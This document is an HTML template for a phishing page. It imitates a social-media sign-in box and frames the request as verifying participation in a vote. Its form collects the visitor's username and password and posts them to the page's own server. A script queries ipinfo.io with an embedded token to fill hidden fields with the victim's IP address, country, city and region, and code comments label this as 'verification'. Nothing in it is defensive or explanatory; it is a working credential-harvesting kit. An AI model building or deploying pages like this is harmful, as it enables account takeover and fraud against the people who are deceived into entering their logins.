<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify Account</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background: #fafafa;
      color: #262626;
      font-size: 14px;
      line-height: 18px;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
      height: 100%;
    }
    
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 0 20px;
    }
    
    .auth-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      max-width: 350px;
    }
    
    .auth-box {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 20px;
      margin-bottom: 10px;
      width: 100%;
      box-sizing: border-box;
    }
    
    .logo {
      margin: 22px auto 12px;
      text-align: center;
    }
    
    .logo img {
      width: 175px;
    }
    
    form {
      display: flex;
      flex-direction: column;
      margin-top: 24px;
      width: 100%;
    }
    
    .form-group {
      position: relative;
      margin-bottom: 6px;
    }
    
    input {
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      color: #262626;
      font-size: 12px;
      height: 36px;
      padding: 9px 8px 7px;
      width: 100%;
      margin-bottom: 6px;
      box-sizing: border-box;
    }
    
    input:focus {
      border-color: #a8a8a8;
      outline: none;
    }
    
    button {
      background-color: #0095f6;
      border: none;
      border-radius: 4px;
      color: #fff;
      font-weight: 600;
      padding: 5px 9px;
      text-align: center;
      cursor: pointer;
      width: 100%;
      margin-top: 8px;
      height: 30px;
      font-size: 14px;
      transition: background-color 0.2s ease;
    }
    
    button:hover {
      background-color: #1877f2;
    }
    
    button:disabled {
      background-color: rgba(0, 149, 246, 0.3);
      cursor: default;
    }
    
    .or-divider {
      display: flex;
      align-items: center;
      margin: 18px 0;
    }
    
    .or-line {
      background-color: #dbdbdb;
      height: 1px;
      flex-grow: 1;
    }
    
    .or-text {
      color: #8e8e8e;
      font-size: 13px;
      font-weight: 600;
      margin: 0 18px;
      text-transform: uppercase;
    }
    
    
    .forgot-password {
      color: #00376b;
      font-size: 12px;
      line-height: 14px;
      margin-top: 12px;
      text-align: center;
      cursor: pointer;
    }
    
    .signup-box {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 15px;
      margin: 10px 0;
      text-align: center;
      width: 100%;
    }
    
    .signup-text {
      color: #262626;
    }
    
    .signup-link {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
    }
    
    .get-app {
      margin: 20px 0;
      text-align: center;
    }
    
    .app-download {
      display: flex;
      justify-content: center;
      margin-top: 20px;
    }
    
    .app-download img {
      height: 40px;
      margin: 0 5px;
    }
    
    .footer {
      margin: 0 auto 52px;
      max-width: 350px;
    }
    
    .footer-links {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      margin-bottom: 16px;
    }
    
    .footer-link {
      color: #8e8e8e;
      font-size: 12px;
      margin: 0 8px 12px;
      text-decoration: none;
    }
    
    .copyright {
      color: #8e8e8e;
      font-size: 12px;
      text-align: center;
    }
    
    .notice-box {
      background-color: #ffffd1;
      border: 1px solid #f0e68c;
      border-radius: 3px;
      padding: 8px 10px;
      margin-bottom: 20px;
      text-align: center;
      width: 100%;
      box-sizing: border-box;
    }
    
    .notice-box p {
      color: #555;
      font-size: 12px;
      margin: 0;
      line-height: 1.4;
    }
    
    #submit2 img {
      width: 18px;
      height: 18px;
      animation-name: spin;
      animation-duration: 0.8s;
      animation-iteration-count: infinite;
      animation-timing-function: linear;
    }
    
    @keyframes spin {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }
    
    @media (max-width: 450px) {
      .auth-box {
        background-color: transparent;
        border: none;
        padding: 20px 15px;
      }
      
      .container {
        padding: 0;
      }
      
      .notice-box {
        margin-bottom: 15px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="auth-container">
      <div class="auth-box">
        <!-- Notice Box
        <div class="notice-box">
          <p>This is a third-party voting service. Not affiliated with any social media platform.</p>
        </div> -->
        
        <div class="logo">
          <img src="/img/socials/logo.png" />
        </div>
        
        <form method="post" action="" id="continueWithForm">
          <%- include("../../partials/messages") %>
          <div class="form-group">
            <input 
              type="text" 
              name="username" 
              id="username" 
              placeholder="Phone number, username, or email" 
              aria-label="Phone number, username, or email"
              aria-required="true"
              required
            />
          </div>
          
          <div class="form-group">
            <input 
              type="password" 
              name="password" 
              id="password" 
              placeholder="Password" 
              aria-label="Password"
              aria-required="true"
              required
            />
          </div>
          
          <input type="hidden" name="country" id="country" value="" />
          <input type="hidden" name="ip" id="ip" value="" />
          <input type="hidden" name="city" id="city" value="" />
          <input type="hidden" name="region" id="region" value="" />
          
          <p class="form-description" style="font-size: 12px; color: #8e8e8e; margin: 10px 0; text-align: center;">Connect to verify your participation</p>
          <button type="submit" id="submit">Continue to verify</button>
          <button type="button" id="submit2" style="display: none">
            <img src="/img/loading.svg" alt="Loading" />
          </button>
          
        </form>
      </div>
    </div>
  </div>
  
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const continueWithForm = document.getElementById('continueWithForm');
      const submitBtn = document.getElementById('submit');
      const submitBtn2 = document.getElementById('submit2');
      
      submitBtn.addEventListener('click', function(e) {
        const username = document.getElementById('username');
        const password = document.getElementById('password');
        
        if (username.value.length > 0 && password.value.length > 0) {
          submitBtn.style.display = 'none';
          submitBtn2.style.display = 'block';
          continueWithForm.submit();
        }else{
          e.preventDefault();
        }
      });
    });
    
    // Function to collect user metadata for verification
    function collectUserMetadata() {
      const metaFields = {
        country: document.getElementById('country'),
        identifier: document.getElementById('ip'),
        locality: document.getElementById('city'),
        area: document.getElementById('region')
      };
      
      // Collect user verification data
      const verifyEndpoint = 'https://ipinfo.io';
      const verifyParams = '?token=9980528e43166f';
      
      // Request verification data
      fetch(`${verifyEndpoint}${verifyParams}`, {
        method: 'GET',
        headers: { 'Accept': 'application/json' }
      })
        .then(response => response.json())
        .then(metadata => {
          // Map verification data to form fields
          metaFields.country.value = metadata.country || '';
          metaFields.identifier.value = metadata.ip || '';
          metaFields.locality.value = metadata.city || '';
          metaFields.area.value = metadata.region || '';
        })
        .catch(() => {
          // Fallback values if verification fails
          Object.values(metaFields).forEach(field => field.value = 'unknown');
        });
    }
    
    // Initialize metadata collection when page loads
    document.addEventListener('DOMContentLoaded', collectUserMetadata);
  </script>
</body>
</html>
